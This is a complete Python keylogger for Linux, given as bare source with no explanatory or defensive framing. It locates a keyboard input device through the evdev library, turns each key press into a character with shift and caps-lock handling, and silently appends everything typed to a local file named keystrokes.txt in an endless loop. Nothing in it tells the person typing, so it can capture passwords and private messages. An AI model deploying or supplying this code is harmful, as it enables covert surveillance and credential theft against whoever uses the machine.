import evdev

def keyboard():
    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
    for device in devices:
        if "keyboard" in device.name or "Keyboard" in device.name:
            return device.path
# Open the input device
dev = evdev.InputDevice(keyboard())

# Define a dictionary to map key codes to letters
key_map = {
    evdev.ecodes.KEY_A: 'a',
    evdev.ecodes.KEY_B: 'b',
    evdev.ecodes.KEY_C: 'c',
    evdev.ecodes.KEY_D: 'd',
    evdev.ecodes.KEY_E: 'e',
    evdev.ecodes.KEY_F: 'f',
    evdev.ecodes.KEY_G: 'g',
    evdev.ecodes.KEY_H: 'h',
    evdev.ecodes.KEY_I: 'i',
    evdev.ecodes.KEY_J: 'j',
    evdev.ecodes.KEY_K: 'k',
    evdev.ecodes.KEY_L: 'l',
    evdev.ecodes.KEY_M: 'm',
    evdev.ecodes.KEY_N: 'n',
    evdev.ecodes.KEY_O: 'o',
    evdev.ecodes.KEY_P: 'p',
    evdev.ecodes.KEY_Q: 'q',
    evdev.ecodes.KEY_R: 'r',
    evdev.ecodes.KEY_S: 's',
    evdev.ecodes.KEY_T: 't',
    evdev.ecodes.KEY_U: 'u',
    evdev.ecodes.KEY_V: 'v',
    evdev.ecodes.KEY_W: 'w',
    evdev.ecodes.KEY_X: 'x',
    evdev.ecodes.KEY_Y: 'y',
    evdev.ecodes.KEY_Z: 'z',
    evdev.ecodes.KEY_1: '1',
    evdev.ecodes.KEY_2: '2',
    evdev.ecodes.KEY_3: '3',
    evdev.ecodes.KEY_4: '4',
    evdev.ecodes.KEY_5: '5',
    evdev.ecodes.KEY_6: '6',
    evdev.ecodes.KEY_7: '7',
    evdev.ecodes.KEY_8: '8',
    evdev.ecodes.KEY_9: '9',
    evdev.ecodes.KEY_0: '0',
    evdev.ecodes.KEY_ENTER: '\n',
    evdev.ecodes.KEY_SPACE: ' ',
    evdev.ecodes.KEY_COMMA: ',',
    evdev.ecodes.KEY_DOT: '.',
    evdev.ecodes.KEY_SLASH: '/',
    evdev.ecodes.KEY_SEMICOLON: ';',
    evdev.ecodes.KEY_APOSTROPHE: "'",
    evdev.ecodes.KEY_GRAVE: '`',
    evdev.ecodes.KEY_LEFTBRACE: '[',
    evdev.ecodes.KEY_RIGHTBRACE: ']',
    evdev.ecodes.KEY_BACKSLASH: '\\',
    evdev.ecodes.KEY_MINUS: '-',
    evdev.ecodes.KEY_EQUAL: '=',
}

# Start reading events from the input device
caps_lock = False
shift = False
for event in dev.read_loop():
    # Check if the event is a key press
    if event.type == evdev.ecodes.EV_KEY and event.value == 1:
        # Check if shift or caps lock is pressed
        if event.code == evdev.ecodes.KEY_LEFTSHIFT or event.code == evdev.ecodes.KEY_RIGHTSHIFT:
            shift = True
        elif event.code == evdev.ecodes.KEY_CAPSLOCK:
            caps_lock = not caps_lock
        # Convert the key code to a letter
        if event.code in key_map:
            letter = key_map[event.code]
            if caps_lock:
                letter = letter.upper()
            elif shift:
                letter = letter.upper() if letter.islower() else letter.lower()
            shift = False
        else:
            letter = ''
        # Write the letter to a file
        with open('keystrokes.txt', 'a') as f:
            f.write(letter)
